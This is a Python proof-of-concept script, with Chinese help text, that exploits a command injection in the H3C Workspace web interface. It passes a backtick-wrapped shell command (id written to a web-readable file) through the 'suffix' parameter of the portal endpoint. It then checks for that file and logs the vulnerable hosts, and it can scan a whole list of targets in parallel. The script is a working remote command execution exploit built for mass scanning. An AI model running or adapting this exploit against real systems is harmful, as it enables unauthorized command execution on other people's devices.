import argparse
import requests
import concurrent.futures
import sys

def poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
    }
    vulnurl = url + "/webui/?g=aaa_portal_auth_adv_submit&tab_name=广告模板&welcome_word=广告模板&btn_color=337ab7&suffix=%7Burlenc(%60id+%3E/usr/local/webui/test.txt%60)%7D&bkg_flag=0&check_btn_color=&des=undefined"
    okurl = url + "/webui/test.txt"
    try:
        # 发送 POST 请求
        r = requests.get(vulnurl, headers=headers, verify=False, timeout=5)
        t = requests.get(okurl, verify=False, timeout=5)
        if t.status_code == 200:
            print('\033[1;31m' + '【+】 Success ' + okurl + '\033[0m')
            with open('results.txt', 'a') as f:
                    f.write(okurl + '\n')
        else:
            print('【-】 Failed')
    except requests.exceptions.RequestException as e:
        print(f"连接失败: {e}")
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """  _   _ _____  ____  __        __         _                             
 | | | |___ / / ___| \ \      / /__  _ __| | _____ _ __   __ _  ___ ___ 
 | |_| | |_ \| |      \ \ /\ / / _ \| '__| |/ / __| '_ \ / _` |/ __/ _ \/
 |  _  |___) | |___    \ V  V / (_) | |  |   <\__ \ |_) | (_| | (_|  __/
 |_| |_|____/ \____|    \_/\_/ \___/|_|  |_|\_\___/ .__/ \__,_|\___\___|
                                                  |_|                   """
    print(helpinfo)
    print("H3C Workspace".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("@zhiang".rjust(100," "))


def main():
    parser = argparse.ArgumentParser(description='H3C Workspace漏洞单批检测脚本')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        poc(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(poc, urls)
    else:
        help()
if __name__ == '__main__':
    main()
